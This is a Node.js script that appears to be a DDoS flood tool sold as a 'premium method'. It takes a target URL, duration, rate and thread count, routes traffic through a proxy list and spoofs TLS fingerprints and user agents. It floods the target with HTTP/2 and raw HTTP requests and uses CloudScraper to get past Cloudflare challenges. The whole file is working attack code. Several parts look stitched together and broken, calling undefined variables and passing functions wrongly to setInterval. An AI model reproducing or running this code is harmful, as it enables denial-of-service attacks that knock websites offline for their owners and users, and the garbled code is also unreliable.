             console.log('⠂⡀⠀⠌⢿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣹⣿⣿⣮⢝⢶⡹⢞⣎⠳⣭⢻⢿⣦⣄⣀⡡⠀⠂⠀⢂⠀⠌⠀⠡⠀⣈⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡯⣝⣫⠶⣭⢳⢞⣥⣿⣿⣿⣿⣿⣿⢻⣿⣿⠀⢀⠀⡀⠂⠌⠀');
             console.log('⠠⠄⠁⠀⠀⠙⢿⣿⡄⠙⢿⣿⣿⣿⣷⣻⣿⣿⣿⣖⡝⣮⣜⢳⡬⢧⢫⣿⣿⣿⣿⣿⣷⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡱⢧⡳⢏⡶⣋⣾⣿⣿⣿⣟⣿⣿⡏⢸⡿⠃⠀⠄⠂⠄⠀⠀⡁');
             console.log('⡁⠂⠀⠈⠠⢀⠂⠀⠉⠁⠄⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣶⣜⢧⡹⢎⡳⣬⢿⡟⠙⢷⣮⡗⢯⡻⣽⢫⣟⡾⢯⣹⢿⣿⣿⣿⣿⡟⢿⣧⡟⣭⢳⣭⢛⣴⣿⣿⣿⣿⠏⣼⣿⣿⠃⠉⠁⠠⢀⠀⠀⢐⠈⡐⠀');
             console.log('⠡⢰⢠⠂⠁⠀⠠⠐⠀⠁⠈⠀⠄⡀⠹⣿⣿⣿⣌⣻⣿⣿⣿⣿⣷⣯⣭⢳⡱⣚⣧⠀⠀⠉⢛⡿⣵⡾⣛⡽⠞⠋⢁⠀⣷⢹⣿⣿⣿⣿⣿⢏⣳⣭⣶⣿⣿⣿⡿⠛⢁⣰⣿⣿⠃⠀⢀⠂⠁⠈⠀⢀⠂⠈⠀⠆');
             console.log('\033[1;37m        ');  
console.log('\033[1;37m                            T L S E D I T I O N');  
console.log('\033[1;37m                                M E T H O D');  
console.log('\033[1;37m                            ');  
 if (process.argv.length < 5){console.log(`Usage: node TlsEdition.js [ URL ] [ TIME ] [ RATE ] [ THREADS ]\nExample: node TlsEdition.js https://example.com 100 10 1\n \n                              PREMIUM METHODS\n                       DONT ATTACK .GOV .EDU WEBSITE`); process.exit();}
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
 
 const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
 
 const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_client_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: sigalgs,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
 var proxyFile = "proxy.txt";
 var proxies = readLines(proxyFile);
 var userAgents = readLines("ua.txt");
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5]
 }
 
 const parsedTarget = url.parse(args.target);

const nullHexs = [
"\x00", 
"\xFF", 
"\xC2", 
"\xA0",
"\x62",
"\x61",
"\x6D",
"\x7D",
"\x68",
"\x7B",
"\x06",
"\x8F",
"\x67",
"\x7F",
"\x14",
"\x1E",
"\x1F",
"\x1E",
"\x1C",
"\x18",
"\x15",
"\x15",
"\x15",
"\x1E",
"\x15",
"\x18",
"\x15",
"\x48",
"\x47",
"\x46",
"\x5A",
"\x44",
"\x46",
"\x48",
"\x43",
"\x5A",
"\x47",
"\x5F",
"\x5B",
"\x46",
"\x4F",
"\x48",
"\x5B",
"\x5A",
"\x4E",
"\x4F",
"\x5B",
"\x5A",
"\x4D",
"\x5B",
"\x5A",
"\x5B",
"\x5A"
];

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        //console.log("Threads " + counter +  " started.");
        cluster.fork();
    }
    console.clear();
    console.log('\033[91m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗');
    console.log('\033[91m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║');
    console.log('\033[91m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩');
    console.log('\033[1;37m                            ATTACK HAS START TO TARGET!');  
} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, startflood, send_req, banjir, sendattack, 0) }}

 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
     connection.setNoDelay(true)
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

function getRandomUserAgent() {
    const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    return finalString;
  }

 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
 function randomCharacters(length) {
     output = ""
     for (let count = 0; count < length; count++) {
         output += randomElement(characters);
     }
     return output;
 }
 
 headers[":method"] = "GET";
 headers[":method"] = "POST";
 headers[":path"] = parsedTarget.path;
 headers[":scheme"] = "https";
 headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
 headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
 headers["accept-encoding"] = "gzip, deflate, br";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
 headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
 headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "same-origin";
 headers["upgrade-insecure-requests"] = "1";
 
 function randString(length) {
  var _ = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    _ += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return _;
}
 
function loadSettings(target, host) {
  var rw =
    `GET ` +
    target +
    " HTTP/1.3\r\nHost: " +
    host +
    "\r\nReferer: " +
    target +
    "\r\nOrigin: " +
    target +
    "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nuser-agent: " +
    random_ua.generate() +
    "\r\nUpgrade-Insecure-Requests: 1\r\n" +
    "Accept-Encoding: br\r\nContent-Type: *\r\nAlt-Used: " +
    target +
    "\r\nAccept-Language: en-US,en;q=0.9\r\n" +
    "Cache-Control: max-age=0\r\n" +
    `Connection: Keep-Alive\r\n\r\n`;
  return rw;
}

function sendattack(){
    const currentProxy = proxyList[proxyIndex].split(":");
    const httpRequest = http.request({
      method: "CONNECT",
      host: currentProxy[0],
      port: currentProxy[1],
      path: website.host,
      headers: {
        "Host": website.host
      }
    })
    
    httpRequest.on("error", () => {
      console.clear();
      listIndex ++;
      sendConnection(listIndex);
      if (listIndex == proxyList.length - 1) listIndex = 0;
      console.log("An unknown error occurred");
    })

    httpRequest.on("connect", (_, socket) => {
      const client = http2.connect(website.href, { socket });
      setInterval(() => {
        if (!client.destroyed) {
          const request = client.request({ 
            ":path": website.pathname,
            "user-agent": useragentList[Math.floor(Math.random() * useragentList.length)]
          })
          request.on("end", () => setTimeout(() => client.destroy(), 10000));
          request.on("error", () => {});
        }
      }, 100)
    })

    httpRequest.end();
  }

  setInterval(() => {
    sendConnection(listIndex);
    listIndex ++;
    if (listIndex == proxyList.length - 1) listIndex = 0;
  }, 300)

function startflood(){
    var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 64; i++) {
        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        s.write('HEAD ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		s.write('POST ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
    });
    setTimeout(() => clearInterval(int), time * 1000);
}

let getHeaders = function () {
    return new Promise(function (resolve, reject) {
        CloudScraper.get({
            uri: target,
            resolveWithFullResponse: true,
            challengesToSolve: 1
        }, function (error, response) {                                                                                                                                                                                    //BY ITSC2 BY LINTAR
            if (error) {
                //If cloudscraper return an error will retry
                console.log(`ERROR: ${error.message}, retrying the request.`);
                return start();
            }
            let headers = '';
            Object.keys(response.request.headers).forEach(function (i, e) {
                //The following headers might break the request
                if (['content-length', 'Upgrade-Insecure-Requests', 'Accept-Encoding'].includes(i)) {
                    return;
                }
                headers += i + ': ' + response.request.headers[i] + '\r\n';
            });

            console.log(headers);
            resolve(headers);
        });
    });
}
                                                              
                                                                                                                    

function send_req(headers) {
    const net = require('net'),
        client = new net.Socket();

    client.connect(80, host);
    client.setTimeout(10000);

    for (let i = 0; i < req_per_ip; ++i) {
        client.write(                                                                                                                                                                                    //BY ITSC2 BY LINTAR
            `GET ${target} HTTP/1.1\r\n` +
            headers + '\r\n\r\n'
        )
    }

    client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    });
}

function banjir(){
	var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 64; i++) {
        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
	});
	setTimeout(() => clearInterval(int), time * 1000);
}

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
 
     /** headers dynamic */
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = randomElement(userAgents);
     headers["x-forwarded-for"] = parsedProxy[0];
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 15
     };
     
     const req = http.request(requestOptions, (res) => {
  // Handle response
});

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true)
 
         const settings = {
             enablePush: false,
             initialWindowSize: 1073741823
         };

         const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: [
                "h2"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 100000);
         tlsConn.setKeepAlive(true, 60 * 1000000);
         tlsConn.setKeepAlive(true, 443 * 10000000);
         tlsConn.setKeepAlive(true, 80 * 100000000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: settings,
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn
             //socket: connection,
         });
         
         const attack = http2.connect(parsedTarget.href, {
             protocol: "http:",
             settings: settings,
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn
             //socket: connection,
         });
 
         client.setMaxListeners(0);
         client.settings(settings);
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    headers["referer"] = "http://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 10000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 100000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});